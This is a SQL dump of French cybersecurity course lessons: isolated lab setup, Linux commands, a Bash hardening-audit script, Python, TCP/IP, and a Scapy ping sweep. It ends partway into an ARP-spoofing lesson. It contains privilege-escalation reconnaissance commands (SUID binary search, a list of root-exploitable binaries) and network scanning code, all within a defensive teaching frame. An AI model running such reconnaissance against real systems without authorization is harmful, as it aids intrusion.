INSERT INTO "lessons" VALUES('les_cp_vol1_lab1','m_vol1_2','lab-01-02-construire-son-laboratoire-isole-virtualbox-kali','LAB 01 & 02 : Construire son Laboratoire Isolé de Cybersécurité','Mise en place pas à pas d''un environnement de virtualisation hermétique sous VirtualBox avec Kali Linux, cible vulnérable et réseau Host-Only étanche.','# LAB 01 & 02 : Construire son Laboratoire Virtuel Isolé

Pour s''entraîner en toute sécurité et conformément aux règles déontologiques de RayLab, vous devez impérativement opérer dans un laboratoire virtuel étanche, sans risque de propager du trafic malveillant sur votre réseau domestique ou professionnel.

---

## 1. Topologie du Laboratoire Isolé

```
               [ MACHINE PHYSIQUE HÔTE ]
            (Windows 11 / macOS / Ubuntu)
                          |
             [ VIRTUALBOX HYPERVISEUR ]
                          |
         +----------------+----------------+
         |                                 |
[ VM ATTAQUANTE ]                  [ VM CIBLE VULNÉRABLE ]
  Kali Linux 2026                    Metasploitable / DVWA
  IP: 192.168.56.10                  IP: 192.168.56.20
         |                                 |
         +----------------+----------------+
                          |
             [ RÉSEAU PRIVÉ HÔTE SEUL ]
             (Host-Only Network : vboxnet0)
             PAS D''ACCÈS AU ROUTEUR EXTERNE !
```

---

## 2. Configuration Réseau Sous VirtualBox

VirtualBox propose plusieurs modes de cartes réseau :
1. **NAT :** La machine virtuelle a accès à Internet via l''IP de l''hôte, mais les autres VMs ne peuvent pas la joindre directement.
2. **Accès par pont (Bridged) :** La VM reçoit une adresse IP directe de votre box Internet. **À PROSCRIRE pour des machines vulnérables**, car elles deviennent exposées à tous les appareils du réseau local !
3. **Réseau privé hôte (Host-Only) :** Crée un commutateur virtuel purement interne entre votre hôte et vos VMs. Les paquets ne quittent jamais votre ordinateur. **C''est le mode recommandé pour les labs d''exploitation !**

---

## 3. Commandes Fondamentales de Vérification sous Kali Linux

Dès le premier démarrage de votre machine attaquante Kali Linux, exécutez ces vérifications :

```bash
# 1. Vérification des interfaces réseau et adresses IP
ip a

# 2. Mise à jour des dépôts de paquets officiels
sudo apt update && sudo apt upgrade -y

# 3. Installation des outils Python essentiels pour la sécurité
sudo apt install -y python3-pip python3-venv python3-scapy python3-paramiko

# 4. Création d''un environnement virtuel Python isolé pour RayLab
mkdir -p ~/raylab-workspace && cd ~/raylab-workspace
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip requests scapy cryptography
```

---

## 4. Règle des Snapshots (Instantanés)

> [!TIP]
> Avant de réaliser le moindre test d''intrusion ou de lancer un script de reverse shell, prenez un **Snapshot (Instantané)** de vos machines virtuelles dans l''interface de VirtualBox. En cas de blocage, de corruption du système de fichiers ou d''infection incontrôlée, vous pourrez restaurer la machine à son état sain en moins de 10 secondes !
','lab',4,45,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol2_ch6','m_vol2_1','commandes-linux-pipelines-filtres-permissions-octales','Commandes Linux, Pipelines, Filtres (grep, awk, sed) & Permissions','Maîtriser les flux de redirection standard (stdout, stderr), l''enchaînement de commandes et le calcul des permissions octales POSIX.','# Commandes Linux, Pipelines, Filtres & Permissions POSIX

Dans l''univers de la cybersécurité, le terminal Linux est votre interface principale de travail. La quasi-totalité des serveurs cibles, des pare-feux et des conteneurs s''administrent en ligne de commande.

---

## 1. La Philosophie des Flux Standard & Pipelines UNIX

Sous UNIX, « tout est fichier », et tout programme lancé dispose automatiquement de trois descripteurs de flux fondamentaux :
* **Descripteur 0 : Entrée standard (stdin)** — flux entrant depuis le clavier ou un pipe.
* **Descripteur 1 : Sortie standard (stdout)** — flux de sortie normale des résultats.
* **Descripteur 2 : Sortie d''erreur (stderr)** — flux des messages d''erreur et alertes.

### Redirections :
```bash
# Rediriger stdout vers un fichier (écrase le fichier)
commande > resultat.txt

# Rediriger stdout en mode ajout (append)
commande >> historique.log

# Rediriger stdout ET stderr dans le même fichier
commande > sortie.txt 2>&1

# Ignorer totalement les erreurs en les envoyant dans le trou noir /dev/null
find / -name "*.conf" 2>/dev/null
```

### Le Pipe (`|`) : La Chaîne de Traitement
Le tube (`|`) injecte directement la sortie standard du programme de gauche dans l''entrée standard du programme de droite.

Exemple d''extraction d''adresses IP uniques connectées à un serveur :
```bash
netstat -ant | grep ESTABLISHED | awk ''{print $5}'' | cut -d: -f1 | sort | uniq -c | sort -nr
```

---

## 2. Les Outils de Filtrage Essentiels : `grep`, `awk` et `sed`

* **`grep` (Global Regular Expression Print) :** Recherche de motifs textuels ou d''expressions régulières.
  ```bash
  # Trouver tous les échecs de connexion SSH dans le journal d''authentification
  grep -i "failed password" /var/log/auth.log
  ```
* **`awk` :** Langage complet de traitement par colonnes. Par défaut, `awk` découpe chaque ligne selon les espaces.
  ```bash
  # Afficher le nom d''utilisateur ($1) et son shell par défaut ($7) depuis /etc/passwd
  awk -F: ''{print $1, "utilise le shell :", $7}'' /etc/passwd
  ```
* **`sed` (Stream Editor) :** Édition de flux à la volée (rechercher/remplacer).
  ```bash
  # Remplacer toutes les occurrences de HTTP par HTTPS dans un fichier de configuration
  sed -i ''s/http:/https:/g'' /etc/nginx/sites-available/default
  ```

---

## 3. Le Modèle de Permissions POSIX & Calcul Octal

Chaque fichier ou répertoire sous Linux possède des droits pour trois entités distinctes :
1. **User (u) :** Le propriétaire du fichier.
2. **Group (g) :** Le groupe propriétaire.
3. **Others (o) :** Tout autre utilisateur du système.

Les droits se décomposent en trois permissions binaires :
* **Read (r) :** Valeur octale **4** (binaire `100`). Permet de lire le contenu.
* **Write (w) :** Valeur octale **2** (binaire `010`). Permet de modifier ou supprimer.
* **Execute (x) :** Valeur octale **1** (binaire `001`). Permet d''exécuter un script ou de traverser un répertoire (`cd`).

```
Droits :  r w x   r - x   r - -
Binaire : 1 1 1   1 0 1   1 0 0
Octal :     7       5       4
Total :  chmod 754 mon_script.sh
```

### Les Permissions Spéciales Majeures pour le Pentesteur :
* **SUID (Set User ID) — Octal 4000 :** Lorsqu''un binaire possède le bit SUID (ex: `-rwsr-xr-x`), il s''exécute toujours avec les privilèges de son **propriétaire**, souvent `root`, quel que soit l''utilisateur qui le lance !
* **SGID (Set Group ID) — Octal 2000 :** Exécute avec les privilèges du groupe propriétaire.
* **Sticky Bit — Octal 1000 :** Présent sur `/tmp` (`drwxrwxrwt`), il empêche un utilisateur de supprimer le fichier d''un autre utilisateur même dans un dossier partagé en écriture.

Pour trouver tous les binaires SUID sur un serveur Linux lors d''une phase d''élévation de privilèges :
```bash
find / -perm -4000 -type f 2>/dev/null
```
','article',1,40,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol2_proj1','m_vol2_2','projet-01-script-administration-audit-securite-linux','PROJET 01 : Développement d''un Script d''Audit Système et Durcissement','Conception et écriture d''un script Bash professionnel qui audite les comptes UID 0, les binaires SUID dangereux et les ports en écoute sur un serveur Linux.','# PROJET 01 : Script d''Administration & Audit de Sécurité Linux

Dans le cadre du **Projet 01 de CyberPath**, vous allez développer un outil d''inspection automatisé en Bash capable de dresser un bilan de sécurité rapide sur tout serveur Debian ou Ubuntu fraîchement provisionné.

---

## 1. Objectifs Techniques du Script d''Audit

Le script doit vérifier automatiquement :
1. **Les comptes utilisateurs anormaux :** Repérer tout compte autre que `root` possédant l''identifiant UID 0 dans `/etc/passwd`.
2. **Les mots de passe vides :** Vérifier qu''aucun compte n''a de champ de mot de passe vide dans `/etc/shadow`.
3. **Les binaires SUID non standards :** Inventorier les exécutables ayant le bit SUID activé.
4. **Les ports TCP en écoute :** Vérifier quels démons écoutent sur `0.0.0.0` (exposés à Internet).
5. **La configuration SSH :** Vérifier si `PermitRootLogin` et `PasswordAuthentication` sont autorisés dans `/etc/ssh/sshd_config`.

---

## 2. Implémentation Complète du Script (`audit_securite.sh`)

Voici le script complet, commenté et conforme aux standards de production :

```bash
#!/usr/bin/env bash
# =============================================================================
# RAYLAB SECURITY TOOLKIT - PROJET 01 CYBERPATH
# Script d''Audit Rapide de Durcissement Linux
# Usage : sudo ./audit_securite.sh
# =============================================================================

set -euo pipefail

# Couleurs pour le terminal
RED=''\033[0;31m''
GREEN=''\033[0;32m''
YELLOW=''\033[1;33m''
BLUE=''\033[0;34m''
NC=''\033[0m'' # No Color

echo -e "${BLUE}=====================================================${NC}"
echo -e "${BLUE}       AUDIT DE SÉCURITÉ SYSTÈME LINUX — RAYLAB      ${NC}"
echo -e "${BLUE}=====================================================${NC}"
echo -e "Date de l''audit : $(date ''+%Y-%m-%d %H:%M:%S'')"
echo -e "Hôte audité     : $(hostname -f) ($(uname -srm))\n"

# 1. Vérification des privilèges d''exécution
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] ERREUR : Ce script d''audit doit être exécuté en root (sudo).${NC}"
   exit 1
fi

# 2. Vérification des comptes UID 0
echo -e "${YELLOW}[*] Vérification des comptes avec UID 0 (Privilèges root) :${NC}"
comptes_uid0=$(awk -F: ''($3 == 0) {print $1}'' /etc/passwd)
for compte in $comptes_uid0; do
    if [[ "$compte" == "root" ]]; then
        echo -e "  [+] Compte root légitime identifié : ${GREEN}root${NC}"
    else
        echo -e "  ${RED}[ALERTE CRITIQUE] Compte suspect avec UID 0 détecté : $compte${NC}"
    fi
done

# 3. Vérification des binaires SUID critiques
echo -e "\n${YELLOW}[*] Inventaire des binaires SUID critiques dans /usr/bin :${NC}"
suid_critiques=("bash" "sh" "python" "python3" "perl" "ruby" "vim" "nano" "nmap" "find")
for binaire in "${suid_critiques[@]}"; do
    if find /usr/bin -name "$binaire" -perm -4000 2>/dev/null | grep -q "$binaire"; then
        echo -e "  ${RED}[DANGER SUID GTFOBINS] Binaire exploitable en root : /usr/bin/$binaire${NC}"
    fi
done
echo -e "  ${GREEN}[✓] Contrôle des binaires SUID dangereux terminé.${NC}"

# 4. Vérification de la configuration SSH
echo -e "\n${YELLOW}[*] Audit de la configuration SSH (/etc/ssh/sshd_config) :${NC}"
if [[ -f /etc/ssh/sshd_config ]]; then
    root_login=$(grep -Ei ''^\s*PermitRootLogin'' /etc/ssh/sshd_config || echo "PermitRootLogin non spécifié (défaut)")
    echo -e "  Statut Root Login : ${root_login}"
    
    auth_pass=$(grep -Ei ''^\s*PasswordAuthentication'' /etc/ssh/sshd_config || echo "PasswordAuthentication non spécifié")
    echo -e "  Statut Mot de Passe : ${auth_pass}"
else
    echo -e "  ${BLUE}[i] Aucun service SSH installé sur cet hôte.${NC}"
fi

# 5. Vérification des ports TCP en écoute
echo -e "\n${YELLOW}[*] Services en écoute sur toutes les interfaces (0.0.0.0) :${NC}"
ss -tulpn | grep LISTEN | grep ''0.0.0.0'' | while read -r line; do
    echo -e "  ${YELLOW}->${NC} $line"
done

echo -e "\n${GREEN}=====================================================${NC}"
echo -e "${GREEN}             RAPPORT D''AUDIT TERMINÉ                 ${NC}"
echo -e "${GREEN}=====================================================${NC}"
```

---

## 3. Recommandations de Durcissement (CIS Benchmarks)

À l''issue de cet audit, voici les trois règles immédiates à appliquer :
1. Désactiver la connexion directe en root sous SSH : `PermitRootLogin no`.
2. Imposer l''authentification par clé publique SSH (Ed25519) et désactiver les mots de passe : `PasswordAuthentication no`.
3. Supprimer les permissions SUID superflues sur les utilitaires administratifs : `chmod u-s /usr/bin/find`.
','interactive',2,50,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol3_ch9','m_vol3_1','python-moderne-syntaxe-typage-pep484-structures','Python Moderne 3.12+ : Typage Statique, Match-Case & Structures','Maîtriser les spécifications modernes de Python : annotations de type PEP 484, filtrage par motif (structural pattern matching) et structures de données optimisées.','# Python Moderne 3.12+ : Typage PEP 484, Pattern Matching & Collections

Issu des **Parties I, II et III du Manuel Complet de Python**, ce cours vous initie aux pratiques d''ingénierie logicielle contemporaines de Python 3.12+. En cybersécurité comme en développement d''API, l''écriture de code typé, prévisible et robuste est une exigence absolue.

---

## 1. Le Typage Statique Optionnel (PEP 484 & PEP 526)

Python demeure un langage à typage dynamique fort, mais les annotations de types permettent d''éliminer des catégories entières de bogues avant l''exécution grâce aux analyseurs statiques (`mypy`, `pyright`) :

```python
from typing import Final, Optional
from dataclasses import dataclass

# Constante immuable avec type explicite
MAX_TENTATIVES_AUTH: Final[int] = 5

@dataclass(frozen=True)
class ReglePareFeu:
    port: int
    protocole: str
    action: str  # ''ALLOW'' ou ''DENY''
    description: Optional[str] = None

def evaluer_regle(paquet_port: int, regle: ReglePareFeu) -> bool:
    """Retourne True si le paquet est autorisé par la règle."""
    if paquet_port == regle.port and regle.action == "ALLOW":
        return True
    return False
```

---

## 2. Le Structural Pattern Matching (`match / case` introduit en Python 3.10)

Le `match/case` remplace avantageusement les longues séries de `if / elif / else` en permettant la déconstruction directe des structures d''objets, de dictionnaires ou de tuples :

```python
def analyser_reponse_serveur(reponse: dict[str, any]) -> str:
    match reponse:
        case {"status": 200, "data": {"user_id": uid, "role": "admin"}}:
            return f"[+] Administrateur authentifié : ID={uid}"
        case {"status": 200, "data": {"user_id": uid}}:
            return f"[+] Utilisateur standard connecté : ID={uid}"
        case {"status": 401 | 403, "error": message}:
            return f"[!] Échec d''autorisation : {message}"
        case {"status": int(code), "error": message} if code >= 500:
            return f"[CRITICAL] Erreur serveur interne ({code}) : {message}"
        case _:
            return "[?] Format de réponse réseau non reconnu."
```

---

## 3. Les Collections Optimisées de la Bibliothèque Standard

Le module `collections` fournit des conteneurs hautement performants :
* **`collections.deque` :** File à double extrémité avec insertion et suppression en temps constant $O(1)$ à gauche comme à droite (contrairement aux listes Python ordinaires où `list.pop(0)` s''exécute en $O(n)$).
* **`collections.Counter` :** Idéal pour compter les fréquences d''adresses IP ou de mots de passe lors de l''analyse forensique de logs.
* **`collections.defaultdict` :** Dictionnaire évitant les erreurs `KeyError` en générant automatiquement une valeur par défaut.

Exemple de calcul des 3 adresses IP les plus agressives dans un flux de logs :
```python
from collections import Counter

logs_ips = [
    "192.168.1.50", "10.0.0.1", "192.168.1.50", "185.220.101.5",
    "192.168.1.50", "185.220.101.5", "10.0.0.1", "192.168.1.50"
]

compteur = Counter(logs_ips)
print("[*] Top 2 des adresses les plus fréquentes :")
for ip, occurrences in compteur.most_common(2):
    print(f"    - IP {ip} : {occurrences} requêtes")
```
','article',1,45,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol3_ch10','m_vol3_2','poo-avancee-encapsulation-property-dunder-methods','Programmation Orientée Objet : Encapsulation, @property & Dunder','Architecture logicielle robuste : constructeur __init__, encapsulation stricte, décorateur @property, et méthodes spéciales (__str__, __repr__, __eq__).','# Programmation Orientée Objet Avancée & Méthodes Spéciales

Tiré des **Parties IV et V du Manuel Complet de Python**, ce chapitre décortique l''ingénierie orientée objet en Python : encapsulation des états sensibles, validation de données par accesseurs et surcharge d''opérateurs via les méthodes dunder (*double underscore*).

---

## 1. Encapsulation & Propriétés Décorées (`@property`)

En Python, la convention veut qu''un attribut préfixé par un trait de soulignement simple `_nom` soit considéré comme privé par convention, tandis qu''un double soulignement `__nom` active le *name mangling* (renommage interne par l''interpréteur pour éviter les collisions d''héritage).

Le décorateur `@property` permet de définir des accesseurs (getters) et des mutateurs (setters) élégants avec validation automatique :

```python
class CibleAudit:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port # Déclenche automatiquement le setter de validation

    @property
    def port(self) -> int:
        """Getter de lecture du port."""
        return self._port

    @port.setter
    def port(self, valeur: int) -> None:
        """Setter avec validation rigoureuse des plages réseau valides."""
        if not isinstance(valeur, int):
            raise TypeError("Le port réseau doit être un entier.")
        if not (1 <= valeur <= 65535):
            raise ValueError(f"Port invalide : {valeur}. La plage autorisée est 1..65535.")
        self._port = valeur

    def est_port_privilegie(self) -> bool:
        """Retourne True si le port est < 1024 (réservé aux services root sous Linux)."""
        return self._port < 1024
```

---

## 2. Les Méthodes Spéciales Dunder (`__repr__`, `__str__`, `__eq__`, `__hash__`)

Les méthodes dunder permettent d''intégrer vos propres classes au comportement natif du langage Python :

```python
class HoteReseau:
    def __init__(self, ip: str, mac: str):
        self.ip = ip
        self.mac = mac.upper()

    def __repr__(self) -> str:
        """Représentation formelle non ambiguë destinée aux développeurs et logs."""
        return f"HoteReseau(ip={self.ip!r}, mac={self.mac!r})"

    def __str__(self) -> str:
        """Représentation lisible destinée à l''utilisateur final."""
        return f"{self.ip} [{self.mac}]"

    def __eq__(self, other: object) -> bool:
        """Deux hôtes réseau sont considérés identiques si leur adresse MAC physique est identique."""
        if not isinstance(other, HoteReseau):
            return NotImplemented
        return self.mac == other.mac

    def __hash__(self) -> int:
        """Permet d''utiliser l''objet comme clé de dictionnaire ou dans un ensemble (set)."""
        return hash(self.mac)
```

---

## 3. Gestionnaire de Contexte Personnalisé (`__enter__` et `__exit__`)

Le protocole de gestionnaire de contexte permet d''utiliser l''instruction `with` pour garantir la libération des ressources (fermeture de sockets, libération de verrous) même en cas d''exception non gérée :

```python
import socket

class SocketAuditSecurise:
    def __init__(self, hote: str, port: int, timeout: float = 1.0):
        self.hote = hote
        self.port = port
        self.timeout = timeout
        self.sock: socket.socket | None = None

    def __enter__(self) -> socket.socket:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.hote, self.port))
        return self.sock

    def __exit__(self, exc_type, exc_val, exc_tb) -> bool:
        if self.sock:
            self.sock.close()
        # Retourne False pour laisser propager l''exception si une erreur est survenue
        return False
```
','article',2,50,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol4_ch12','m_vol4_1','modeles-osi-tcpip-encapsulation-adressage-mac-ip','Modèles OSI vs TCP/IP : Encapsulation & Adressage Réseau','Comprendre le parcours d''une donnée à travers les 7 couches du modèle OSI et les 4 couches TCP/IP, l''encapsulation et les en-têtes.','# Modèles OSI vs TCP/IP : Encapsulation & Architecture des Flux

En cybersécurité, comprendre à quelle couche réseau se situe une vulnérabilité (ou un équipement de défense) est primordial. Le modèle théorique OSI à 7 couches et le modèle pratique Internet TCP/IP à 4 couches fournissent cette grille de lecture universelle.

---

## 1. Correspondance entre Modèle OSI et Modèle TCP/IP

```
+------------------------------------+--------------------------+-----------------------+
|        MODÈLE OSI (7 COUCHES)      |    MODÈLE TCP/IP         |   UNITÉ DE DONNÉE     |
+------------------------------------+--------------------------+-----------------------+
| 7. Application (HTTP, DNS, SSH)    |                          |                       |
| 6. Présentation (TLS, ASCII, JSON) | 4. APPLICATION           | Message / Payload     |
| 5. Session (RPC, Sockets, NetBIOS) |                          |                       |
+------------------------------------+--------------------------+-----------------------+
| 4. Transport (TCP, UDP, ICMP)      | 3. TRANSPORT             | Segment (TCP) /       |
|                                    |                          | Datagramme (UDP)      |
+------------------------------------+--------------------------+-----------------------+
| 3. Réseau (IPv4, IPv6, ARP, ICMP)  | 2. INTERNET              | Paquet (Packet)       |
+------------------------------------+--------------------------+-----------------------+
| 2. Liaison de Données (Ethernet,   |                          |                       |
|    Wi-Fi 802.11, VLAN 802.1Q)      | 1. ACCÈS RÉSEAU          | Trame (Frame)         |
| 1. Physique (Câbles RJ45, Fibres,  |    (Network Access)      | Bits (0 et 1)         |
|    Ondes Radio)                    |                          |                       |
+------------------------------------+--------------------------+-----------------------+
```

---

## 2. Le Mécanisme de l''Encapsulation des Données

Lorsqu''une application (ex: un client Web qui demande `GET /index.html`) envoie une donnée sur le réseau, chaque couche inférieure lui ajoute son propre en-tête (Header) :

```
[ Données Applicatives ]                               (Couche 7)
       |
       v  + Ajout de l''en-tête TCP (Ports source et destination)
[ En-tête TCP | Données Applicatives ]                 (Couche 4 : Segment)
       |
       v  + Ajout de l''en-tête IP (Adresses IP source et cible, TTL)
[ En-tête IP | En-tête TCP | Données Applicatives ]    (Couche 3 : Paquet)
       |
       v  + Ajout de l''en-tête Ethernet (Adresses MAC) et du FCS (Checksum)
[ En-tête Eth | En-tête IP | En-tête TCP | Données | FCS ] (Couche 2 : Trame)
```

À la réception, le destinataire effectue l''opération inverse, appelée **Désencapsulation** : il vérifie la somme de contrôle de la trame, retire l''en-tête Ethernet, traite l''en-tête IP, réassemble le segment TCP et livre les données brutes à l''application destinataire.

---

## 3. Adressage Physique (MAC) vs Adressage Logique (IP)

* **L''Adresse MAC (Media Access Control) :** Adresse matérielle unique de 48 bits (6 octets, ex: `00:1A:2B:3C:4D:5E`) gravée sur la carte réseau (NIC). Elle ne permet que la communication au sein du même réseau local (Couche 2). Les trois premiers octets désignent le constructeur (OUI - Organizationally Unique Identifier).
* **L''Adresse IP (Internet Protocol) :** Adresse logique routable (32 bits en IPv4, 128 bits en IPv6) qui permet d''acheminer un paquet d''un sous-réseau à un autre à travers des routeurs interconnectés (Couche 3).
* **Le Protocole ARP (Address Resolution Protocol) :** Fait le lien indispensable entre Couche 3 et Couche 2 en répondant à la question : *« Quelle est l''adresse MAC correspondant à l''adresse IP 192.168.1.1 ? »*.
','article',1,40,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol4_ch14','m_vol4_2','handshake-trois-voies-tcp-drapeaux-gestion-sockets','Le Handshake à 3 Voies TCP (SYN, SYN-ACK, ACK) & Drapeaux','Étude détaillée de la RFC 793 : poignée de main TCP, séquence des drapeaux (SYN, ACK, FIN, RST, PSH, URG), états de connexion et analyse des attaques de déni de service SYN Flood.','# Le Handshake TCP à 3 Voies, Drapeaux & États Réseau

Le protocole **TCP (Transmission Control Protocol - RFC 793)** est un protocole orienté connexion, fiable et ordonné. Contrairement à UDP qui transmet sans garantie de livraison, TCP établit formellement une session bilatérale avant d''échanger le moindre octet de données.

---

## 1. La Poignée de Main à 3 Voies (TCP Three-Way Handshake)

Pour ouvrir une connexion TCP entre un Client et un Serveur, trois segments doivent être échangés :

```
CLIENT (Port éphémère 51234)                        SERVEUR (Port 80 HTTP)
      |                                                        |
      | -------- 1. [SYN] Seq = ISN_C -----------------------> | (Serveur écoute : LISTEN)
      |                                                        | État serveur : SYN_RECEIVED
      | <------- 2. [SYN, ACK] Seq = ISN_S, Ack = ISN_C + 1 -- |
      | État client : ESTABLISHED                              |
      |                                                        |
      | -------- 3. [ACK] Seq = ISN_C + 1, Ack = ISN_S + 1 --> |
      |                                                        | État serveur : ESTABLISHED
      |                                                        |
      | <==== CONNEXION ÉTABLIE : ÉCHANGE DE DONNÉES PSH/ACK =>|
```

1. **Étape 1 : Le SYN (Synchronize)** : Le client choisit un numéro de séquence initial aléatoire (ISN - *Initial Sequence Number*) et l''envoie avec le drapeau `SYN=1`.
2. **Étape 2 : Le SYN-ACK** : Le serveur reçoit la demande, alloue une structure mémoire (socket TCB), choisit son propre ISN et confirme la réception en incrémentant le numéro de séquence du client (`Ack = ISN_C + 1`).
3. **Étape 3 : Le ACK (Acknowledge)** : Le client confirme la réception de l''ISN du serveur. La session passe à l''état `ESTABLISHED`.

---

## 2. Les Drapeaux TCP (TCP Control Bits)

Dans l''en-tête TCP de 20 octets, 6 drapeaux binaires (Flags) contrôlent la machine à états de la session :

| Drapeau | Nom Complet | Rôle Opérationnel | Utilisation Pentest / Sécurité |
| :--- | :--- | :--- | :--- |
| **SYN** | Synchronize | Initialise une connexion et négocie les ISN. | Utilisé pour les scans de ports (SYN Stealth scan `nmap -sS`). |
| **ACK** | Acknowledgment | Confirme la bonne réception d''octets de données. | Tout segment suivant le premier SYN a ACK=1. |
| **FIN** | Finish | Demande la fermeture propre et ordonnée de la session. | Utilisé dans le scan FIN (`nmap -sF`). |
| **RST** | Reset | Interrompt brutalement la connexion (rejet ou erreur). | Envoyé par un port fermé lorsqu''il reçoit un SYN. |
| **PSH** | Push | Demande à la pile TCP de délivrer immédiatement les données au buffer de l''application sans attendre que le paquet soit plein. | Utilisé pour les shells interactifs et frappes clavier. |
| **URG** | Urgent | Indique que des données prioritaires sont présentes (champ Urgent Pointer). | Scan XMAS (`nmap -sX`). |

---

## 3. Vecteur d''Attaque : L''Attaque SYN Flood (Déni de Service)

Un attaquant envoie une rafale massive de paquets `SYN` avec des adresses IP sources falsifiées (IP Spoofing) sans jamais envoyer le troisième segment `ACK`.
* Le serveur alloue des ressources en mémoire et reste bloqué à l''état `SYN_RECEIVED` en attendant le `ACK` jusqu''au timeout.
* Lorsque la table des connexions en attente (SYN Backlog) est saturée, le serveur refuse toute nouvelle connexion légitime.

### Contre-Mesure Défensive : Les SYN Cookies
Le noyau Linux implémente les **SYN Cookies** (`sysctl -w net.ipv4.tcp_syncookies=1`) : au lieu de stocker la connexion dans le backlog, le serveur encode les informations de la session dans le numéro de séquence initial lui-même à l''aide d''un hash cryptographique avec clé secrète. Aucune mémoire n''est allouée tant que le client n''a pas répondu par un `ACK` valide !
','article',2,45,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol5_scapy','m_vol5_1','dissection-injection-paquets-scapy-python','Forge & Injection de Paquets Réseau avec Scapy (Python)','Apprenez à manipuler les couches 2, 3 et 4 en Python pur à l''aide de Scapy : création de trames Ethernet, paquets IP, balayage ICMP et envoi réseau.','# Dissection & Forge Artisanale de Paquets avec Scapy

Issu du manuel de référence **Python Hacking Éthique (Chapitres 3 et 4)**, ce cours explore la bibliothèque Python **Scapy**, le standard mondial pour l''artisanat de paquets, l''audit réseau, le fuzzing et la découverte de vulnérabilités.

---

## 1. La Syntaxe d''Empilement des Couches dans Scapy

Scapy utilise l''opérateur de division `/` pour empiler les couches de la pile réseau de gauche à droite (de la couche basse vers la couche haute) :

```python
from scapy.all import Ether, IP, TCP, Raw

# Création d''un paquet TCP complet encapsulé dans IP et Ethernet
trame = Ether(dst="aa:bb:cc:11:22:33") / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / Raw(b"GET / HTTP/1.0\r\n\r\n")

# Inspection détaillée des champs de chaque couche
trame.show()
```

Lorsque vous instanciez un paquet, Scapy calcule automatiquement les valeurs par défaut non spécifiées (sommes de contrôle Checksum, longueurs de trames, protocole sous-jacent, adresses IP sources).

---

## 2. Balayage ICMP Ping Sweep Automatisé en Python

Voici un script complet permettant de sonder un sous-réseau entier en quelques secondes à l''aide de requêtes `ICMP Echo Request` (Type 8) :

```python
from scapy.all import IP, ICMP, sr, conf
import sys

# Désactivation des messages verbeux internes de Scapy
conf.verb = 0

def balayer_reseau_icmp(plage_cidr: str) -> list[str]:
    """
    Envoie des requêtes ICMP Echo Request et récupère les hôtes actifs.
    Exemple de plage : ''192.168.1.0/24''
    """
    print(f"[*] Lancement du balayage ICMP sur : {plage_cidr}")
    
    # Création du paquet ICMP pour toute la plage CIDR
    paquet = IP(dst=plage_cidr) / ICMP()
    
    # sr() transmet les paquets et écoute les réponses (Couche 3)
    reponses, non_repondus = sr(paquet, timeout=1.5, retry=1)
    
    hotes_actifs = []
    for envoi, reponse in reponses:
        # Si la réponse est un ICMP Echo Reply (Type 0)
        if reponse.haslayer(ICMP) and reponse[ICMP].type == 0:
            ip_hote = reponse[IP].src
            ttl = reponse[IP].ttl
            hotes_actifs.append(ip_hote)
            print(f" [+] Hôte actif détecté : {ip_hote:15s} (TTL: {ttl})")
            
    print(f"[*] Audit terminé : {len(hotes_actifs)} machine(s) active(s) identifiée(s).")
    return hotes_actifs

if __name__ == "__main__":
    balayer_reseau_icmp("192.168.1.0/24")
```

---

## 3. Les Fonctions d''Envoi Fondamentales de Scapy

* **`send(paquet)` :** Envoie des paquets en **Couche 3** (Scapy gère la couche 2 Ethernet automatiquement).
* **`sendp(trame)` :** Envoie des trames en **Couche 2** (vous devez spécifier l''en-tête `Ether()` et l''interface réseau).
* **`sr(paquet)` :** Send & Receive en Couche 3. Retourne deux listes : les paquets ayant reçu une réponse et les paquets sans réponse.
* **`sr1(paquet)` :** Variante de `sr()` qui retourne uniquement la **première** réponse reçue (idéal pour tester l''état d''un port TCP).
* **`sniff(filter="...", prn=callback)` :** Capture le trafic réseau en temps réel avec des filtres BPF (Berkeley Packet Filters).
','article',1,50,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol5_arp','m_vol5_2','attaque-man-in-the-middle-arp-spoofing-scapy-defense','Attaque Man-in-the-Middle (MITM) : Empoisonnement ARP & Défense DAI','Étude mécanique approfondie de l''ARP Cache Poisoning : détournement de flux réseau, activation du routage sysctl ip_forward et contre-mesures de sécurité (DAI, tables statiques).','# Attaque Man-in-the-Middle : Empoisonnement de Table ARP & Contre-Mesures

Basé sur le **Chapitre 5 de Python Hacking Éthique**, ce cours décortique l''une des attaques de réseau local (LAN) les plus redoutables : l''usurpation d''adresses ARP (**ARP Cache Poisoning / ARP Spoofing**), permettant à un attaquant de positionner sa machine au milieu des communications chiffrées ou en clair.

---

## 1. La Vulnérabilité Intrinsèque du Protocole ARP (RFC 826)

Conçu au début des années 1980 pour des réseaux locaux de confiance, le protocole ARP souffre d''un défaut de conception majeur : **il ne dispose d''aucun mécanisme d''authentification ou de signature cryptographique**.
* Tout hôte accepte des réponses ARP (**Gratuitous ARP Reply** - `op=2`) même s''il n''a jamais émis de requête !
* Lorsqu''une machine reçoit une réponse ARP affirmant qu''une IP est associée à une nouvelle adresse MAC, elle met immédiatement à jour sa table ARP locale sans vérification.

---

## 2. Mécanique de l''Attaque en Sablier (Man-in-the-Middle)

```
        AVANT L''ATTAQUE (Flux Normal) :
